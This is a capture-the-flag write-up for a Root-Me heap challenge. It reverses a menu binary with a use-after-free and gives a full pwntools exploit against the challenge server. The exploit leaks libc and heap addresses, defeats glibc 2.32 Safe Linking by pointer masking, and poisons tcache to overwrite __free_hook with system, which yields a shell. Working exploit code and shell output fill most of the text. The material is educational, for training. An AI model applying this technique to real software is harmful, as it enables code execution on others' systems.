---
title: PWN ROOT-ME , Safe Linking Bypass.
tags: [pwn, safe-linking, heap-exploitation, tcache]
---
# Summary
This challenge have an UAF bug which occures when freeing a chunk is some way , but glibc version is ``2.32`` so we have to deal with ``Safe Linking`` by getting a heap leak.

# Understanding The Program Flow

The binary have a five choices menu which allows you  to **allocate a bloc**, **delete a bloc**, **edit a bloc** , **show a bloc** and **freeze a bloc**. Reversing this binary is not hard , i am going to explain briefly through every choice.

#### Allocating a bloc
```C
    if ( choice == 1 )
    {
      index = get_index();
      puts("Bloc Size:");
      if ( (unsigned int)__isoc99_scanf("%lu", size) != 1 )
        exit(-1);
      v4 = size[0];
      if ( size[0] > 1280 )
      {
        puts("Bad size..");
        exit(-1);
      }
      sizes[index] = size[0];
      *heap[index] = malloc(v4);
      puts("Data:");
      size[0] = read(0, *((void **)&heap + index), size[0]);
      *(_BYTE *)(*((_QWORD *)&heap + index) + size[0] - 1) = 0;
    }
```

This function is so simple it takes an **index** ( without checking if this index is availble or not , this will be usefull later) , a **size** which should not more than 1280 ,   and finally it takes **data** into the allocated chunk.

#### Freezing a bloc
```C
    if ( choice == 5 )
    {
      index = get_index();
      if ( freezed == -1 )
        freezed = index;
    }
```
Simple choice , it prompts for an index and checks if ``freezed`` global variable is equal to  **-1** , if condition is met the ``freezed`` variable gets the index value. this choice will get in handy when i explain how **deleting a bloc** works. **NB : This choice is only a one time use since we are going to change ``freezed`` value to index value so the condition check for if freezed equals -1 now is false**

#### Deleting a bloc

**PS: i usually do my reversing in ida but for this choice ida gave me some false positive so i had to do it using ghidra.**

```C
        if (choice == 2) {
          index = get_index();
          if (*(void **)(heap + index * 8) != (void *)0x0) {
            if ((freezed == index) && (isfreezed != 0)) goto LAB_00100c8b;
            free(*(void **)(heap + index * 8));
          }
          if (freezed == index) {
            isfreezed = 1;
          }
          else {
            *(undefined8 *)(heap + index * 8) = 0;
          }
        }
```

our bug lays here ,  by tricking the program we can achieve a ``UAF Bug`` but this bug is only availble for only one index so we need to use it carefully.

#### Editing a bloc
```C
    if ( choice == 3 )
    {
      index = get_index();
      if ( *((_QWORD *)&heap + v7) )
      {
        puts("Data:");
        size[0] = read(0, *((void **)&heap + index), sizes[v7]);
        *(_BYTE *)(*((_QWORD *)&heap + v7) + sizes[index] - 1LL) = 0;
```


#### Showing a bloc
```C
    if ( choice == 4 )
    {
      index = get_index();
      if ( *((_QWORD *)&heap + index) )
      {
        puts("Data:");
        puts(*((const char **)&heap + index));
      }
    }
```

# Exploitation 

now we have a brief idea about the functinality of the program, let's try some exploitation.

creating some helpers 
```python
#!/usr/bin/env python3
from pwn import *
context.update(os="linux", arch = "amd64", log_level="debug")
exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.32.so")
context.binary = exe
#p = process("./chall_patched")
p = remote("challenge03.root-me.org", 56589)
def alpha(heap, target):
    return target ^ (heap >> 0xc)

def x(): gdb.attach(p)
def sl(choice): p.sendlineafter(b"Choice?\n", str(choice))
def add(idx,size,content:bytes):
    sl(1)
    p.sendlineafter("Index:", str(idx))
    p.sendlineafter("Size:", str(size))
    p.sendafter("Data:", content)

def free(idx):
    sl(2)
    p.sendlineafter("Index:", str(idx))

def edit(idx,content:bytes):
    sl(3)
    p.sendlineafter("Index:", str(idx))
    p.sendafter("Data:", content)
def show(idx):
    sl(4)
    p.sendlineafter("Index:", str(idx))

def freeze(idx):
    sl(5)
    p.sendlineafter("Index:", str(idx))

def decrypt(cipher):
    key = 0
    for i in range(1, 6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain

def main():
    x()
    p.interactive()

if __name__ == "__main__":
    main()

```

i am going to explain what ``alpha()`` and ``decrypt()`` functions does later on .

#### Libc base leaking : 
```python
    add(0, 0x428, b"A"*8)
    add(1 ,0x18, b"B"*8)
    freeze(0)
    free(0)
    add(2, 0x438, b"E" * 8)
    show(0)
    print(p.recvline())
    print(p.recvline())
    libc_base = u64(p.recvline().strip(b"\n").ljust(8,b"\x00")) - 0x1e3ff0
    print(hex(libc_base))
```
here i allocated a big chunk so it goes beyong the tcache bin size range so i can get a libc pointer.
chunk with index 1 is for preventing consolidation. freeing the **index 0 chunk** then i add an another chunk which is bigger than the first one to push the first chunk into the large bin. So generally in classic heap exploitation challenges we use unsorted bin to leak libc , in this case if we use unsorted bin it's going to be a dead end since the address of the **head of unsorted bin** in ``main_arena`` contains a ``null byte`` ,  the function **show a bloc** uses ``puts`` to show the content of a bloc and ``puts`` stops in a ``null byte`` so we have to figure out another way to leak the libc. i choose ``large bin`` , ``small bin`` also may works (i didn't try it). so now our heap state is like this.

```
gef➤  heap bins
───────────────────────────────────────────────────────────────────────────────────────────────────────── Tcachebins for thread 1 ─────────────────────────────────────────────────────────────────────────────────────────────────────────
Tcachebins[idx=63, size=0x410, count=1] ←  Chunk(addr=0x563e88fbc2a0, size=0x410, flags=PREV_INUSE) 
────────────────────────────────────────────────────────────────────────────────────────────────── Fastbins for arena at 0x7fc631bf2ba0 ──────────────────────────────────────────────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
──────────────────────────────────────────────────────────────────────────────────────────────── Unsorted Bin for arena at 0x7fc631bf2ba0 ────────────────────────────────────────────────────────────────────────────────────────────────
[+] Found 0 chunks in unsorted bin.
───────────────────────────────────────────────────────────────────────────────────────────────── Small Bins for arena at 0x7fc631bf2ba0 ─────────────────────────────────────────────────────────────────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────────────────────────────────────────────────────────────────────────────────── Large Bins for arena at 0x7fc631bf2ba0 ─────────────────────────────────────────────────────────────────────────────────────────────────
[+] large_bins[63]: fw=0x563e88fbc6a0, bk=0x563e88fbc6a0
 →   Chunk(addr=0x563e88fbc6b0, size=0x430, flags=PREV_INUSE)
[+] Found 1 chunks in 1 large non-empty bins.
```

```
0x563e88fbc6a0: 0x0000000000000000      0x0000000000000431
0x563e88fbc6b0: 0x00007fc631bf2ff0      0x00007fc631bf2ff0
0x563e88fbc6c0: 0x0000563e88fbc6a0      0x0000563e88fbc6a0
0x563e88fbc6d0: 0x0000000000000000      0x0000000000000000
gef➤  
0x563e88fbc6e0: 0x0000000000000000      0x0000000000000000
0x563e88fbc6f0: 0x0000000000000000      0x0000000000000000
0x563e88fbc700: 0x0000000000000000      0x0000000000000000
0x563e88fbc710: 0x0000000000000000      0x0000000000000000
0x563e88fbc720: 0x0000000000000000      0x0000000000000000
0x563e88fbc730: 0x0000000000000000      0x0000000000000000
0x563e88fbc740: 0x0000000000000000      0x0000000000000000
.........................................................
.........................................................
0x563e88fbcad0: 0x0000000000000430      0x0000000000000020
0x563e88fbcae0: 0x0042424242424242      0x0000000000000000
```

the output from the program 
```
b'Data:\n'
0x7fc631a0f000 // libc base
[*] running in new terminal: ['/usr/bin/gdb', '-q', './chall_patched', '57940']
[DEBUG] Created script for new terminal:
    #!/usr/bin/python3
    import os
    os.execve('/usr/bin/gdb', ['/usr/bin/gdb', '-q', './chall_patched', '57940'], os.environ)
[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/tmp/tmptd_0eyj7']
[+] Waiting for debugger: Done
[*] Switching to interactive mode
What do you want to do...
1 . Alloc a bloc
2 . Free a bloc
3 . Edit a bloc
4 . Show a bloc
5 - Freeze a bloc
Choice?
$  
```
libc base leaking is done we go for heap base leak.

#### Heap base leak
Well in usual ``Tcache poisining attacks`` heap base leaks is not required but since ``libc 2.32`` introduced ``Safe Linking`` heap base now is a must to be able to solve such challenges.
for more information, about ``Safe Linking``:  **https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/**

```python
    add(3, 0x20, b"X" * 8)
    add(4, 0x20, b"Z" * 8)
    add(5, 0x18, b"/bin/sh\x00")
    free(4)
    free(3)
    show(0)
    print(p.recvline())
    print(p.recvline())
    leak = u64(p.recvline().strip(b"\n").ljust(8,b"\x00"))
    heap_base = decrypt(leak) -0x2d0#- 0x6e0 for local
    print(hex(heap_base))
```
now the array that contains the heap pointer is this program is called ``heap`` . In this array index 0 and index 3 hold the same pointer for the same chunk which we are going to use to get a heap leak . first we allcoate 2 chunks with the same size , and another with any size (just to prevent from merging). now we free both of them so the tcache bin state for size 0x20 is like this 
``TCACHE[0x20] = INDEX_0_FWD points_to => INDEX_1 ``
as we said earlier index 0 and index 3 in the heap array have the same pointer so by showing the index 0 chunk we get a heap leak (we can't do the same by showing index 3 because index 3 have been nulled in the heap array).
finally we have to decrypt the pointer that we leaked using the ``decrypt()`` function to regain the original pointer and calculate the heap base.
output:
```
b'Data:\n'
0x5620321ce410
[*] running in new terminal: ['/usr/bin/gdb', '-q', './chall_patched', '61258']
[DEBUG] Created script for new terminal:
    #!/usr/bin/python3
    import os
    os.execve('/usr/bin/gdb', ['/usr/bin/gdb', '-q', './chall_patched', '61258'], os.environ)
[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/tmp/tmpxoowqif3']
[+] Waiting for debugger: Done
[*] Switching to interactive mode
What do you want to do...
1 . Alloc a bloc
2 . Free a bloc
3 . Edit a bloc
4 . Show a bloc
5 - Freeze a bloc
Choice?
$  
```

Heap state : 
```
0x5620321ce6a0: 0x0000000000000000      0x0000000000000031
0x5620321ce6b0: 0x00005625501fc72e      0x00005620321ce010 //encryped pointer.
0x5620321ce6c0: 0x00005620321ce6a0      0x00005620321ce6a0
0x5620321ce6d0: 0x0000000000000000      0x0000000000000031
0x5620321ce6e0: 0x00000005620321ce      0x00005620321ce010
0x5620321ce6f0: 0x0000000000000000      0x0000000000000000
0x5620321ce700: 0x0000000000000000      0x0000000000000021
0x5620321ce710: 0x0068732f6e69622f      0x00007fc87b900c00
0x5620321ce720: 0x0000000000000000      0x00000000000003b1
0x5620321ce730: 0x00007fc87b900c00      0x00007fc87b900c00
0x5620321ce740: 0x0000000000000000      0x0000000000000000
0x5620321ce750: 0x0000000000000000      0x0000000000000000
0x5620321ce760: 0x0000000000000000      0x0000000000000000
0x5620321ce770: 0x0000000000000000      0x0000000000000000
0x5620321ce780: 0x0000000000000000      0x0000000000000000
.........................................................
.........................................................
0x5620321cead0: 0x00000000000003b0      0x0000000000000020
0x5620321ceae0: 0x0042424242424242      0x0000000000000000
0x5620321ceaf0: 0x0000000000000000      0x0000000000000441
.........................................................
```

calculating necessary addresses
```python
      system = libc_base + libc.sym.system
      hook = libc_base + libc.sym.__free_hook
```

Only one thing left which is to mask the target pointer that we want to overwrite so we bypass ``Safe Linking``. 

```python
      hook = alpha(heap_base, hook)
```

everything is read , classic ``Tcache poising attack`` now .

```python
      edit(0, p64(hook))
      add(6, 0x20, b"A" * 8)
      add(7, 0x20, p64(system))
	  free(5) // triggering the sploit.
```

and we should be good 
```
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x3b bytes:
    b'chall  chall_patched  core  ld-2.32.so\tlibc.so.6  solve.py\n'
chall  chall_patched  core  ld-2.32.so    libc.so.6  solve.py
$ id
[DEBUG] Sent 0x3 bytes:
    b'id\n'
[DEBUG] Received 0xd0 bytes:
    b'uid=1000(retr0) gid=1000(retr0) groups=1000(retr0),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),122(bluetooth),134(scanner),142(kaboxer)\n'
uid=1000(retr0) gid=1000(retr0) groups=1000(retr0),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),122(bluetooth),134(scanner),142(kaboxer)
$  
```

# Full Exploit
```python
#!/usr/bin/env python3
from pwn import *
context.update(os="linux", arch = "amd64", log_level="debug")
exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.32.so")
context.binary = exe
#p = process("./chall_patched")
p = remote("challenge03.root-me.org", 56589)
def alpha(heap, target):
    return target ^ (heap >> 0xc)

def x(): gdb.attach(p)
def sl(choice): p.sendlineafter(b"Choice?\n", str(choice))
def add(idx,size,content:bytes):
    sl(1)
    p.sendlineafter("Index:", str(idx))
    p.sendlineafter("Size:", str(size))
    p.sendafter("Data:", content)

def free(idx):
    sl(2)
    p.sendlineafter("Index:", str(idx))

def edit(idx,content:bytes):
    sl(3)
    p.sendlineafter("Index:", str(idx))
    p.sendafter("Data:", content)
def show(idx):
    sl(4)
    p.sendlineafter("Index:", str(idx))

def freeze(idx):
    sl(5)
    p.sendlineafter("Index:", str(idx))

def decrypt(cipher):
    key = 0
    for i in range(1, 6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain

def main():
    add(0, 0x428, b"A"*8)
    add(1 ,0x18, b"B"*8)
    freeze(0)
    free(0)
    add(2, 0x438, b"E" * 8)
    show(0)
    print(p.recvline())
    print(p.recvline())
    libc_base = u64(p.recvline().strip(b"\n").ljust(8,b"\x00")) - 0x1e3ff0
    print(hex(libc_base))
    add(3, 0x20, b"X" * 8)
    add(4, 0x20, b"Z" * 8)
    add(5, 0x18, b"/bin/sh\x00")
    free(4)
    free(3)
    show(0)
    print(p.recvline())
    print(p.recvline())
    leak = u64(p.recvline().strip(b"\n").ljust(8,b"\x00"))
    heap_base = decrypt(leak) -0x2d0#- 0x6e0
    print(hex(heap_base))
    system = libc_base + libc.sym.system
    hook = libc_base + libc.sym.__free_hook
    hook = alpha(heap_base, hook)
    edit(0, p64(hook))
    add(6, 0x20, b"A" * 8)
    add(7, 0x20, p64(system))
    p.interactive()

if __name__ == "__main__":
    main()
```

**Gihub** : https://github.com/retr0Rocks/CTF-Writeups/tree/main/Root-Me/Safe%20Linking
References:  **https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/**
